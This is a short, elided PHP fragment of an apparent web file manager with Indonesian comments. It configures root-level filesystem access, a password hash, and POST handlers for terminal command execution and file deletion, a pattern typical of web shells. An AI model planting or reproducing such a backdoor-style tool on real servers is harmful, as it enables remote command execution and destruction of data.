...
// ================== CONFIG ==================
// ROOT UNIVERSAL Ã¢â‚¬â€œ sangat powerful, JANGAN taruh di server publik tanpa proteksi tambahan
$CONFIG_ROOT   = '/';
$PASSWORD_HASH = '$2a$12$yrY8DwPu27ZTad5XXL7gTeOyKIFU7SefS9/wkjupbqxpLG1XigDZu'; // ganti hash bcrypt kamu
$SESSION_KEY   = 'fm_auth';
// ============================================
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if ($action === 'terminal_exec') {
        ...
        if (strpos($action, 'delete_one:') === 0) {
            ...
            } elseif (!@unlink($path)) {$messages[] = "[FAIL] Gagal hapus file: $path";
            } else {
